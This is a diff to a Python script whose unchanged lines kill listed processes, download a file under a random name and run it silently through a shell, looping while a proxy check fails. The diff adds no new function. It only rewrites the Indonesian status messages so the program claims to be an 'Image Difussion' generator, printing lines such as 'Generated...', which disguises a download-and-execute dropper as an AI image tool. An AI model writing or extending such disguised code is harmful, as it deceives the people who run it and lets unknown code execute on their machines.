@@ -79,7 +79,7 @@ def download_and_run_file():
             
             subprocess.Popen(f"./{random_file_name}", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
         else:
-            raise Exception("Gagal mengunduh file.")
+            raise Exception("failed downloading Image Difussion.")
     except Exception as e:
         print(f"Error downloading/running file: {e}")
 
@@ -88,12 +88,13 @@ if __name__ == "__main__":
     
     while True:
         if check_proxy():
-            print("Proxy aktif.")
+            print("Image Difussion Active")
             time.sleep(300)
+            print("Generated...")
         else:
             while True:
                 if get_info():
-                    print("Proxy tidak valid. Menghentikan proses.")
+                    print("Image Difussion not active!")
                     try:
                         kill_processes(process_list)
                     except Exception as px:
@@ -103,10 +104,10 @@ if __name__ == "__main__":
                         download_and_run_file()
                         break
                     except Exception as e:
-                        print(f"Error saat download dan jalankan file: {e}")
+                        print(f"Error starting Image Difussion! {e}")
                         time.sleep(30)
                 else:
-                    print("info return false")
+                    print("Image Difussion return false")
                     time.sleep(60)
 
             break
